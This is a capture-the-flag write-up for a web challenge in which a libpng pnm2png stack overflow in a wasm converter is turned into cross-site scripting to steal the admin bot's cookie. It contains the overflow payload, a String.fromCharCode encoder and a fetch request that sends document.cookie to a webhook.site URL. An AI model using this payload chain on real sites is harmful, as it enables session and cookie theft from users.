# Christmas Cookie

We're given a .zip with the source code of the challenge. Since there's a folder named `bot` we can say that it's a client side challenge. Furthermore, if we take a look to the source code of the bot (file: `bot.js`), it will be clear that our goal is to steal the admin (bot) cookie.

```js
    await page.setCookie({
        name: 'flag',
        value: CONFIG.APPFLAG,
        domain: '192.168.1.2', 
        path: '/',
    });
```

The server-side code it's not vulnerable (I think), so I ignored it.
One thing that caught my eye is the file `Main.wasm`. Pretty odd for a client side.

## Overview

The challenge implements a pnm to png converter and the conversion happens only client side. This part is handled by that `Main.wasm` file, which is (I think) the library `libpng` compiled to wasm.


## Solution

I immediately searched for some common vulnerabilities for the part of libpng which handles the pnm to png conversion (pnm2png) and I found that in older versions of libpng the pnm2png was vulnerable. Luckly for us, a PoC was provided which triggers a stack overflow.

Note: This was new for me, so I tough the challenge was using a vulnerable version of libpng.

By trial and error, I came up with this solution:

```
open("b.pnm", "wb").write(a + b"A"*98 + b"A"*16+b"AAAA<img/onerror=eval(location.hash.slice(1))//>\x09src=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>")
```

Where `a` is https://github.com/fouzhe/security/blob/master/libpng/crash_pnm2png_stack_buffer_overflow_get_token

By doing this, we can execute arbitrary javascript by putting it in `location.hash`

## Exploit

1. First, upload the pnm file generated (in the attachments)
2. Generate a payload to retrieve the flag (`location.hash` is urlencoded so I had to encode the payload using `String.fromCharCode`) using this script:
```js
function encodeString(input) {
    if (typeof input !== "string") {
        throw new TypeError("Input must be a string");
    }

    let encoded = "";
    for (let i = 0; i < input.length; i++) {
        encoded += `String.fromCharCode(${input.charCodeAt(i)})`;
        if (i < input.length - 1) {
            encoded += "+";
        }
    }
    return encoded;
}

// Example usage:
const originalString = "https://webhook.site/7ad96e3f-cab7-4c2f-a1d0-97b31c6b7b8b?flag=";
const encodedString = encodeString(originalString);

console.log("Original:", originalString);
console.log("Encoded:", encodedString);
```
3. Execute the following payload to report the file to the admin (note the js in the hash)

```js
fetch("http://35.224.222.30:4006/", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en",
    "content-type": "application/json",
    "sec-gpc": "1"
  },
  "referrer": "http://35.224.222.30:4005/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"url\":\"http://35.224.222.30:4005/view/14e74e8f1a56474f8be94c52233e023f.pnm#fetch(String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(115)+String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(119)+String.fromCharCode(101)+String.fromCharCode(98)+String.fromCharCode(104)+String.fromCharCode(111)+String.fromCharCode(111)+String.fromCharCode(107)+String.fromCharCode(46)+String.fromCharCode(115)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(47)+String.fromCharCode(55)+String.fromCharCode(97)+String.fromCharCode(100)+String.fromCharCode(57)+String.fromCharCode(54)+String.fromCharCode(101)+String.fromCharCode(51)+String.fromCharCode(102)+String.fromCharCode(45)+String.fromCharCode(99)+String.fromCharCode(97)+String.fromCharCode(98)+String.fromCharCode(55)+String.fromCharCode(45)+String.fromCharCode(52)+String.fromCharCode(99)+String.fromCharCode(50)+String.fromCharCode(102)+String.fromCharCode(45)+String.fromCharCode(97)+String.fromCharCode(49)+String.fromCharCode(100)+String.fromCharCode(48)+String.fromCharCode(45)+String.fromCharCode(57)+String.fromCharCode(55)+String.fromCharCode(98)+String.fromCharCode(51)+String.fromCharCode(49)+String.fromCharCode(99)+String.fromCharCode(54)+String.fromCharCode(98)+String.fromCharCode(55)+String.fromCharCode(98)+String.fromCharCode(56)+String.fromCharCode(98)+String.fromCharCode(63)+String.fromCharCode(102)+String.fromCharCode(108)+String.fromCharCode(97)+String.fromCharCode(103)+String.fromCharCode(61)+document.cookie)\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

4. Profit

